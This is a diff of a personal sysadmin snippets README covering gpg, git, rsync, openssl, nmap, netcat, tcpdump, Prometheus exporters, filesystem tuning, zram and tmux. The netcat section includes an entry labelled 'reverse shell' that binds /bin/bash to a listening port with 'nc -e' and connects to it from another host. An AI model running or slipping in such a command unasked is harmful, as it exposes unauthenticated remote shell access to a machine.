@@ -1,4 +1,4 @@
-# slayer's snippets
+> # slayer's snippets
 
 ## mysql
 
@@ -35,6 +35,7 @@ public / private keys
 ```
 ### pub/pri keys cheatsheet
 gpg --gen-key
+gpg --full-gen-key
 gpg --list-keys
 gpg --list-secret-keys
 
@@ -54,7 +55,7 @@ gpg --delete-secret-and-public-keys ID
 
 # after import you can get: It is NOT certain that the key belongs to the person named
 # in the user ID.  If you *really* know what you are doing. To fix:
-gpg --edit-key my_Backups_02 # after type 'edit', and answer '5'
+gpg --edit-key my_Backups_02 # after type 'trust', and answer '5'
 # or use --always-trust
 ```
 
@@ -106,11 +107,12 @@ git push -u origin --all # for all!
 
 ```
 
-# cancel merge
+cancel merge:
+```
 git reset --hard HEAD
 # or
 # git reset --hard ORIG_HEAD
-
+```
 
 set default protocol
 ```
@@ -146,7 +148,7 @@ registry garbage collect
 gitlab-ctl registry-garbage-collect
 ```
 
-## aws s3
+## AWS S3
 
 copy bucket
 ```
@@ -187,10 +189,10 @@ aws s3 cp s3://static.site.com/images/ s3://static.site.com/images/ --exclude "*
 ```
 
 
-
-## sync servers
+## rsync
+### sync servers
 ```
-rsync -avz --checksum --delete \
+rsync -avz --checksum  --delete --progress --human-readable \
   --exclude /backups \
   --exclude /boot \
   --exclude /etc/network \
@@ -203,25 +205,32 @@ rsync -avz --checksum --delete \
 # NOTE: do not forget to update /boot/grub/grub.conf for correct kernel version, root device, imagerd, etc
 ```
 
+### parallel rsync:
+first run with --dry-run:
+`rsync -avzm --stats --safe-links --ignore-existing --dry-run --human-readable /data/projects REMOTE-HOST:/data/ > /tmp/transfer.log`
+
+second:
+`cat /tmp/transfer.log | parallel --will-cite -j 5 rsync -avzm --relative --stats --safe-links --ignore-existing --human-readable {} REMOTE-HOST:/data/ > result.log`
+
+
 ## openssl
+get site list from https host
 ```
-# get site list from https host
 true | openssl s_client -showcerts -connect host:443 2>&1 |
     openssl x509 -text | grep -o 'DNS:[^,]*' | cut -f2 -d:
 ```
 
+dump cert:
+```
+openssl x509 -text -noout -in cert.pem
+```
 
-# nmap
+## nmap
 
 list ciphers
 `nmap --script ssl-enum-ciphers -p 443 www.example.com`
 
 `sslscan`  works too!
-
-# dump cert:
-```
-openssl x509 -text -noout -in cert.pem
-```
 
 
 
@@ -276,6 +285,11 @@ set unless already set
 : ${USERID:=33}
 ```
 
+bell
+```
+echo -ne '\007'
+```
+
 ### Redirections
 
 stdout redirection
@@ -326,7 +340,7 @@ exec 2>&1
 echo "This line will appear in $LOG_FILE, not 'on screen'"
 ```
 
-# Redirect as "file"
+Redirect as "file"
 ```
 vi <(ps ax)
 ```
@@ -390,7 +404,7 @@ systemctl reset-failed
 
 
 ## openvpn
-### to systemd
+### add ovpn config to to systemd
 conf file: `/etc/openvpn/client.conf`
 ```
 systemctl enable openvpn@client
@@ -603,25 +617,39 @@ send udp packet
 `echo -n "foo" | nc -u -w1 192.168.1.100 161`
 
 send file
-`nc -lvp 5555           > /tmp/1.txt # remote`
-`nc 192.168.1.100 5555  < /tmp/1.txt # local`
+```
+# remote
+nc -lvp 5555           > /tmp/1.txt
+
+# local
+nc 192.168.1.100 5555  < /tmp/1.txt
+```
 
 simple http server
-`while true; do nc -lp 8888 < index.html; done`
+```
+while true; do nc -lp 8888 < index.html; done
+```
 
 reverse shell
-`nc -e /bin/bash -lp 4444 # remote`
-`nc 192.168.1.100 4444    # local`
+```
+nc -e /bin/bash -lp 4444 # remote
+
+nc 192.168.1.100 4444    # local
+```
 
 
 ## tcpdump
 dump http traffic on `lo` and port 3200
-`sudo stdbuf -oL -eL /usr/sbin/tcpdump -i lo -A -s 10240 "tcp port 3200 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" | egrep -a --line-buffered ".+(GET |HTTP\/|POST )|^[A-Za-z0-9-]+: " | perl -nle 'BEGIN{$|=1} { s/.*?(GET |HTTP\/[0-9.]* |POST )/\n$1/g; print }'`
+
+```
+sudo stdbuf -oL -eL /usr/sbin/tcpdump -i lo -A -s 10240 "tcp port 3200 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" | egrep -a --line-buffered ".+(GET |HTTP\/|POST )|^[A-Za-z0-9-]+: " | perl -nle 'BEGIN{$|=1} { s/.*?(GET |HTTP\/[0-9.]* |POST )/\n$1/g; print }'
+```
 
 ### fping
 network packet losses
 ```
 fping -i10 -b1460 -o -l -q <addrs.txt
+fping -i10 -b1460 -o -l -q -g 10.8.0.0/24
 ```
 
 ## golang
@@ -781,3 +809,139 @@ Restart network-manager : `sudo service network-manager restart`
 ## elasticsearch
 
 curl -XPUT -H "Content-Type: application/json" http://localhost:9200/_all/_settings -d '{"index.blocks.read_only_allow_delete": null}'
+
+## OOM
+protect process  (postgres in this case)
+```
+pgrep -f postgres | while read PID; do echo -17 > /proc/$PID/oom_adj; done
+```
+
+show OOM score
+```
+alias show-oom-score="while read -r pid comm; do printf '%d\\t%d\\t%s\\n' \"\$pid\" \"\$(cat /proc/\$pid/oom_score)\" \"\$comm\"; done < <(ps -e -o pid= -o comm=)"
+```
+
+
+## IO tuning
+
+- https://unix.stackexchange.com/questions/150211/how-to-reduce-disk-access
+
+add to `/etc/sysctl.d/hdd-minimize-io.conf`
+```
+vm.dirty_background_ratio = 20
+vm.dirty_expire_centisecs = 360000
+vm.dirty_writeback_centisecs = 360000
+```
+
+update `/etc/fstab` of vm's, like:
+
+```
+UUID=e68e1459-b1cf-4255-b860-28cdc4074559 /               ext4    discard,noatime,nodiratime,relatime,errors=remount-ro 0       1
+
+```
+
+
+## GDB
+
+get stacktrace from ruby process
+```
+call (void) close(1)
+call (void) close(2)
+
+shell tty
+
+call (int) open("/dev/pts/0", 2, 0) # substitute output from `tty`
+call (int) open("/dev/pts/0", 2, 0)
+
+call (void)rb_backtrace()
+```
+
+## cron
+
+backup file via cron with `date`
+```
+crontab -e
+
+01 13 * * * sh -c "[ -f /home/user/file ] && cp /home/user/file /backups/`date +\%Y\%m\%d`-file"
+```
+
+## prometheus
+
+### process-exporter for puma and sidekiq
+
+`/etc/process-exporter/config.yaml`
+```
+process_names:
+  - name: "{{.Matches.Worker}}"
+    cmdline:
+    - '(?P<Worker>puma: cluster worker \d)'
+  - name: "{{.Matches.Sidekiq}}"
+    cmdline:
+    - '(?P<Sidekiq>sidekiq).*'
+```
+
+run:
+```
+docker run -d --name=prom-process-exporter --restart=always -p 1.1.1.1:9256:9256 --privileged -v /proc:/host/proc -v /etc/process-exporter/:/config ncabatoff/process-exporter --procfs /host/proc -config.path /config/config.yaml
+```
+
+### postgres exporter
+
+create user and set permissions: https://github.com/wrouesnel/postgres_exporter#running-as-non-superuser
+
+```
+docker run --name prom-postgres-exporter -d --restart=always --net=host \
+    -e DATA_SOURCE_NAME="postgresql://postgres_exporter:pass@1.1.1.1:5432/postgres?sslmode=disable" \
+    wrouesnel/postgres_exporter --web.listen-address=1.1.1.1:9187 --log.level=debug
+```
+
+## block devices
+
+list
+```
+lsblk
+```
+
+Set readahead cache:
+The readahead value is <desired_readahead_bytes> / 512 bytes.
+```
+sudo blockdev --getra /dev/[DEVICE_ID]
+sudo blockdev --setra [VALUE] /dev/[DEVICE_ID]
+```
+
+## mkfs
+
+tuning:
+disable journal, no reserved space for root user
+```
+mkfs.ext4 -m0 -O ^has_journal -E lazy_itable_init=0,lazy_journal_init=0,discard /dev/sdX
+# tune2fs -O ^has_journal /dev/sdX # on existed fs
+mount -o discard,nodiratime,noatime /dev/sdX /dir
+```
+
+
+## zram
+
+```
+ZRAM_DISK_SIZE=5000 # Mb
+ZRAM_DEV=zram1
+modprobe zram num_devices=4
+zramctl ${ZRAM_DEV} -a lz4 -s $((${ZRAM_DISK_SIZE}*1024*1024))
+mkswap /dev/${ZRAM_DEV}
+swapon -p10 /dev/${ZRAM_DEV}
+swapon -s
+
+```
+
+
+## tmux
+
+share tmux with other user (pair) without screen mirroring:
+
+```
+tmux new -s alice # one user
+
+tmux new -s bob -t alice # second user
+
+```
+details: https://www.hamvocke.com/blog/remote-pair-programming-with-tmux/
